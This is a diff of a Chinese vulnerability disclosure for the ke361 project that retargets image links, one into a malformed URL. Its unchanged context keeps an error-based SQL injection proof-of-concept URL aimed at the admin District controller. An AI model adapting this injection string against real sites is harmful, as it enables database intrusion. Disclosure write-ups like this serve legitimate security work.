@@ -18,7 +18,7 @@ https://gitee.com/jcove/ke361
 
 存在漏洞的文件为 `Application/Admin/Controller/DistrictController.class.php`
 
-![image-20220518153238593](C:/Users/47236/AppData/Roaming/Typora/typora-user-images/image-20220518153238593.png)
+![image-20220518153238593](https://c/Users/47236/AppData/Roaming/Typora/typora-user-images/image-20220518153238593.png)
 
 验证POC
 
@@ -26,4 +26,4 @@ https://gitee.com/jcove/ke361
 admin.php?s=/District/index/pid/1)%20AND%20updatexml(1,concat(0x7e,(select%20md5(1)),0x7e),1)--+
 ```
 
-![image-20220518153336344](images/202205181533405.png)
+![image-20220518153336344](../.gitbook/assets/202205181533405.png)
